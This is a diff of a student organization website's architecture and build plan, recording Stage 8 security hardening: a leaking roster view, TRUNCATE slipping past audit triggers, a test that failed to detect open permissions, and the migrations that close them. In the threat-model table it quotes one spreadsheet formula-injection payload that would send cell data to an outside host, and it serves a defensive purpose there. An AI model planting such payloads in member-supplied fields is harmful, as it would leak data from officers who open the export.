@@ -1,9 +1,45 @@
 # Student Organization Website — Architecture & Staged Build Plan
 
-**Version:** 1.51
-**Status:** Stages 0–5 complete. **Stage 6 (member directory) — ✅ COMPLETE, all 9 phases.** **Stage 6.5 (dues & membership status) — COMPLETE, all 4 phases.** **Stage 7 (member-facing views) — ✅ COMPLETE, both phases; exit criteria met.** Stage 8 (hardening & data integrity) is next.
+**Version:** 1.52
+**Status:** Stages 0–5 complete. **Stage 6 — ✅ COMPLETE. Stage 6.5 — ✅ COMPLETE. Stage 7 — ✅ COMPLETE.** **Stage 8 (hardening & data integrity) — phase 1 built; phases 2 (archival export) and 3 (error boundaries) next.**
 **Last updated:** August 2026
 
+> **v1.52: Stage 8 phase 1 — the boundary, proved rather than assumed.**
+> **Migration 22.** The stage exists because two defects of this exact shape
+> already shipped; phase 1 found a third and a fourth.
+>
+> - 🔓 **A signed-in non-officer could read every member's name, EID and
+>   email.** `member_directory` was granted to `authenticated` by migration 15,
+>   on the understanding that the role means "an officer". It does not — it is
+>   what any valid user JWT carries, and production had `disable_signup: false`.
+>   The officer check lives in `lib/auth.ts`, in the **application**; PostgREST
+>   never runs it. Reproduced on the local stack *before* the fix, then revoked.
+>   **A grant to `authenticated` is a grant to the public whenever signup is
+>   open** — migration 15's lesson, one role over.
+> - 🔓 **`grant all` includes TRUNCATE, and RLS cannot restrain TRUNCATE.** It
+>   also skips `admin_audit`'s append-only triggers, which are BEFORE UPDATE and
+>   BEFORE DELETE only. Migration 12's doctrine is false for that one verb, on
+>   the one table where it matters. Grants narrowed to `select`; a statement-level
+>   trigger added behind them.
+> - **"Write every RLS policy" resolved to proving the empty set is correct.**
+>   One policy exists in the whole database and that is right — the app reads
+>   through the service role, and the browser Supabase client has zero
+>   importers. Policies nothing exercises would be untested surface.
+> - 🪤 **The proof matrix was vacuous on its first draft.** `insert({})` fails on
+>   NOT NULL whether or not the role had permission, so "an error came back"
+>   passes through a real hole. It asserts `42501` now, and was re-run against a
+>   deliberately opened grant+policy to confirm it goes red.
+> - 🪤 **`term_index()` is not a validator.** `term_index('Autumn 2026')` = 4052
+>   = `term_index('Spring 2026')`; anything not literally `Fall` is filed as
+>   Spring. A plausible wrong answer, not a null — so the constraint checks the
+>   term's shape instead.
+> - **Six older tables gained the constraints the two newest already had**,
+>   including the one where a `-` EID folds to `''` and collides every such
+>   member into a single phantom identity.
+> - **§6 corrected, not just extended:** append-only is now stated per role, and
+>   the honest boundary is "against the application and every API role, not
+>   against whoever holds the database password."
+>
 > **v1.51: Stage 7 phase 2 — `/lookup`, and the gate that had to be one query.**
 > **No migration.** `lib/lookup.ts`, `lib/request-ip.ts`, `app/actions/lookup.ts`.
 >
@@ -2525,7 +2561,9 @@ The public check-in form is the main attack surface: it accepts unauthenticated 
 
 | Concern | Mitigation |
 |---|---|
-| Anon key over-permission | RLS: anon role can `select` only from `leaderboard` and published `events`. All writes go through Server Actions. |
+| Anon key over-permission | RLS: anon role can `select` only from `leaderboard` and published `events`. All writes go through Server Actions. ✅ **Proven exhaustively in Stage 8**, not reasoned about: `tests/security.test.ts` sweeps every declared table × select/insert/update/delete × anon **and** authenticated, re-reading each write probe as service role to confirm nothing moved. |
+| A signed-in non-officer reads the roster | 🔓 **This was live, and Stage 8 phase 1 closed it (migration 22).** `member_directory` carries every member's name, EID and email; migration 15 revoked it from `anon` and **granted it to `authenticated`** on the understanding that `authenticated` means "an officer". It does not — it is the role any holder of a valid user JWT gets, and `disable_signup` was `false` on production, so it was one confirmed email away for anyone. What distinguishes an officer is an `admin_profiles` row, and **that check lives in `lib/auth.ts`, in the application; PostgREST never runs it.** Reproduced on the local stack before the fix (a signed-up user with no profile read back a real EID), then revoked. Nothing read the view that way — every module touching member data uses the service-role client. ⚠️ The general lesson, which is migration 15's lesson one role over: **a grant to `authenticated` is a grant to the public whenever signup is open.** |
+| `grant all` includes TRUNCATE, which RLS cannot restrain | 🔓 Found in Stage 8's audit. RLS covers SELECT/INSERT/UPDATE/DELETE and **nothing else**, and `admin_audit`'s append-only triggers are `before update` and `before delete` — so TRUNCATE slipped past both while migration 12 handed it to `anon` with `all privileges`. Not reachable (PostgREST exposes no TRUNCATE verb and the API roles are NOLOGIN), but migration 12's stated doctrine — "granting anon DML changes nothing, RLS is the boundary" — **is false for exactly this verb**, on exactly the table where it matters most. Migration 22 narrows anon/authenticated to `select` and adds a statement-level `before truncate` trigger behind that, because a grant can be re-widened by a later migration and a trigger has to be dropped on purpose. |
 | Spam / bot submissions | Honeypot field, per-IP rate limit on the check-in action, submissions rejected outside any open window |
 | Check-in on behalf of someone else | Accepted risk for v1 — same as a paper sign-in sheet. Mitigate later with a rotating per-event code displayed at the venue. |
 | Attendance data enumeration | `/lookup` requires EID **and** matching email before returning history. 🔓 **Built as ONE query carrying both predicates** (`findMemberByBoth`, Stage 7 phase 2), never `lib/checkin.ts`'s ordered fallback — that shape resolves on the EID *or* the email, which would silently reduce this to the EID-alone gate the row below accepts only for check-in. Two tests exist purely to fail if someone "makes it more forgiving". The email side goes through `escapeIlike`, so a `%` is a literal rather than a wildcard past half the gate. |
@@ -2534,7 +2572,8 @@ The public check-in form is the main attack surface: it accepts unauthenticated 
 | A second unauthenticated POST endpoint (Stage 7 phase 2) | `app/actions/lookup.ts` joins `app/actions/attendance.ts` as something anyone can post to. Both are **single-export** files so "what can an anonymous user POST to" stays a two-file, two-symbol answer, and the difference between them is what each may do: `attendance.ts` writes, `lookup.ts` only reads. The one row `lookup.ts` writes anywhere is its throttle record. Honeypot first, echo caps before validation, zod, then the gate. 🔓 **Its own throttle bucket** (`hashClientIp("lookup")`, `LOOKUP_RATE_LIMIT_MAX = 30`), disjoint from check-in's: `RATE_LIMIT_MAX` is a *room capacity*, so a shared budget would let members checking their standing at a meeting exhaust the slots the people behind them need to check in with — and the check-in is the one that must not fail. |
 | Roster pollution via self-registration | The check-in form can create members (§4.2), so junk rows are reachable by anyone who can submit during an open window. Bounded by the window, honeypot, and rate limit; contained by matching on ID and then email before creating, and since v1.22 by requiring an explicit "this is my first MISA event" claim plus a confirmation pass. Visible via `members.source = 'self_checkin'` in the directory. Impact is cleanup, not data loss. **Note what the confirmation is:** a guard against honest typos, not a control. A scripted POST carrying `step=confirm` creates a member in one request without the review screen ever rendering — correct, because the server re-derives the whole outcome rather than trusting the previewed payload, but it means the throttle is still the only thing standing in an attacker's way. |
 | Roster membership is probeable | **Accepted, and it contradicts the officer-login row on purpose** (v1.22). §4.2's re-prompt says "we don't have that info on file", so anyone submitting during a check-in window learns whether a given EID is on the roster. Officer sign-in deliberately does the opposite — one identical failure for "wrong password" and "no such user" — and the two will read as an inconsistency to whoever finds them next unless the difference is written down. The roster is a club list, not a security boundary, and UT EIDs are semi-public; the alternative was an indistinguishable failure that gives a member with a typo no way to tell what went wrong. Bounded three ways: event resolution runs first, so the oracle is closed outside check-in windows entirely; the per-IP throttle applies to both passes; and the answer is a bare boolean — no name, email, or ID of the matched member ever reaches the client, including on the confirmation screen. |
-| Officer grants attendance or points improperly | Every override and adjustment writes an `admin_audit` row with actor, timestamp, before/after values, and a required reason. Triggers reject `UPDATE` and `DELETE`, so the log is append-only for the app and every client role. **Note the limit:** a table owner can disable the trigger, so this constrains the application, not someone with direct database access. Stage 8's RLS policies are what close the client-role path properly. |
+| Officer grants attendance or points improperly | Every override and adjustment writes an `admin_audit` row with actor, timestamp, before/after values, and a required reason. ✅ **Stage 8 replaced the hand-waving here with the measured per-role answer**, because "append-only" was being claimed more strongly than the mechanism delivered:<br>• `anon` / `authenticated` — blocked **twice**: RLS denies before the trigger is reached, and the grant is now `select` only.<br>• `service_role` — bypasses RLS entirely, so **the trigger is the only control**. It holds: UPDATE and DELETE both raise `P0001`, and it cannot disable the trigger (no table ownership, no DDL path through PostgREST).<br>• `postgres` — **can** disable it. That is a routine credential (the SQL editor, the `db push` connection string), not an exotic one, and no `force row level security` exists anywhere either, so the owner bypasses RLS on every table as well.<br>• TRUNCATE — see the row above; covered by a new statement-level trigger as of migration 22.<br>⚠️ So the honest claim is: **append-only against the application and every API role, not against whoever holds the database password.** That is the right boundary for this system (§2.5 puts that password in Bitwarden), but it should be stated rather than implied. |
+| Officer grants points to themselves | ✅ **Allowed and visible, verified in Stage 8** (§9 #10). Not a hole: blocking it just relocates the request to "could you grant me these", which is harder to audit. `grantPoints` carries no self-grant check — there is deliberately no officer↔member linkage in the schema to check against — and `point_adjustments.awarded_by` is `not null` and FKs `auth.users` with no `on delete`, so an adjustment can never be anonymous and the officer who made it can never be deleted out from under it. |
 | Bulk roster export leaks member PII | Export is the largest PII egress point in the system, and a downloaded `.xlsx` or CSV outlives the session that produced it — it lands on a personal laptop and is never revoked. Gate it behind an authenticated session (`getOfficer()` in the Route Handler, 403 on failure), log every export to `admin_audit` with the filter, the **chosen field list**, the format, and the row count, and consider restricting it to the `admin` role. The field picker is a small mitigation as well as a feature: an officer who needs t-shirt sizes should not have to download every email to get them. |
 | Spreadsheet formula injection via member-supplied text | Member names and emails are attacker-chosen — anyone who can check in during an open window supplies their own (see the self-registration row above), so a member named `=HYPERLINK("http://…"&A1,"click")` is reachable by design. Excel and Sheets evaluate a cell beginning `=`, `+`, `-`, or `@` when parsing **CSV**; the officer who opens the export is the victim, not the server. Mitigate in `lib/export.ts` at the CSV writer: prefix any cell matching that pattern with a single quote, or refuse the leading character. **The `.xlsx` path is not exposed** — cells are written as typed strings and stay inert — which is one more reason the two writers must not share a "just join with commas" shortcut. |
 | Dues records are financial-adjacent PII | `dues_payments` holds who paid, how much, when, their Venmo display name and handle, and their free-text note — a category of data nothing else in this system carries, and the reason the threat-model boundary below had to be narrowed. **What it deliberately does not hold: no card numbers, no bank details, no Venmo credentials, and no ability to move money.** The site reads a statement after the fact; the payment happened elsewhere (§1.3, §2.2). Mitigations are the ones already in place rather than new machinery — RLS deny-all on the table, reachable only through `member_directory` (which exposes a **boolean**, never an amount) and officer-authenticated screens, every correction and void audited. Treat a dump of this table as materially worse than a roster dump when scoping Stage 8. |
@@ -2929,13 +2968,30 @@ Correctness resting on five call sites staying complete is the shape this codeba
 ### Stage 8 — Hardening & Data Integrity
 **Goal:** Trust the data enough to base decisions on it.
 
+Three phases, each merged to `main` on completion.
+
+| Phase | Scope | Status |
+|---|---|---|
+| 1 | The database enforces its own rules — **migration 22**: the `authenticated` revoke, the grant narrowing, and the constraint gaps; plus the anon/authenticated proof matrix | ✅ **built 2026-08-09** |
+| 2 | Attendance and adjustment export for archival | |
+| 3 | Error boundaries, loading states, empty states | |
+
 - Write and test every RLS policy; attempt each forbidden operation with the anon key and confirm it fails
 - Confirm `admin_audit` is append-only: no client role can update or delete a row
 - Verify officers cannot grant points or approve attendance for themselves without it being visible in the ledger
 - Attendance and adjustment export for archival
 - Error boundaries, loading states, empty states
 
-**Exit criteria:** attempting to read the roster, write attendance, grant points, or alter an audit row directly with the anon key fails for every table.
+**🔓 What phase 1 actually found, and why the first bullet does not mean what it says**
+
+- **"Write every RLS policy" resolved to "prove the empty set is correct".** The live schema has 11 tables, all RLS-enabled, and exactly **one** policy (`events_public_read`). That is already right: 33 modules read through the service-role client, four touch the anon client, and `lib/supabase/client.ts` — the browser client — has **zero importers**, so the app makes no client-side Supabase call at all. Policies for roles nothing exercises would be untested by construction and pure added surface. What was missing was the proof and tighter grants, and that is what phase 1 built.
+- 🔓 **A signed-in non-officer could read the whole roster.** See §6's row; migration 15's defect one role over, live on production, closed by migration 22.
+- 🔓 **`grant all` includes TRUNCATE and RLS cannot restrain it.** Also §6. This is what turned the grant narrowing from defence-in-depth into a fix.
+- 🪤 **The proof matrix was vacuous on its first draft, and only breaking it on purpose showed that.** Probing `insert({})` and asserting "an error came back" passes even with full permission, because a thin payload trips NOT NULL first. Measured: no grant → `42501`; grant without a policy → `42501`; grant **plus** policy with `{}` → `23502`; grant plus policy with a real payload → **201 Created**. The test now asserts `42501` specifically, and was re-run against a deliberately opened hole to confirm it goes red.
+- 🪤 **`term_index()` is not a validator, and the obvious constraint using it was wrong.** `term_index('Autumn 2026')` returns **4052 — identical to `Spring 2026`** — because its season arm is `case when split_part(t,' ',1) = 'Fall' then 1 else 0 end`, so anything not literally `Fall` is filed as Spring. It never returns null for a bad season; it returns a plausible wrong answer, which is the §4.7 trap family in a new place. The constraint checks the shape (`^(Spring|Fall) [0-9]{4}$`) instead, and `term_index` stays lenient because it backs a stored generated column.
+- **Six older tables gained the constraints the two newest already had**, applying the doctrine `lib/validation.ts` already states — the EID-normalizes-to-≥3 rule (a `-` folds to `''` and every such member collides into one phantom identity), `events.points` bounds, the `events.category` enum, attendance's resolved-pair completeness, term shape, and text lengths. Each proved by SQLSTATE against the live database, the way Stage 1's exit criteria were.
+
+**Exit criteria:** attempting to read the roster, write attendance, grant points, or alter an audit row directly with the anon key fails for every table. ✅ **Met in phase 1**, and widened: the same sweep runs for `authenticated`, which is the role that was actually leaking.
 **Effort:** 3–4 days. Historically the stage most likely to be skipped and most likely to be regretted.
 
 ---
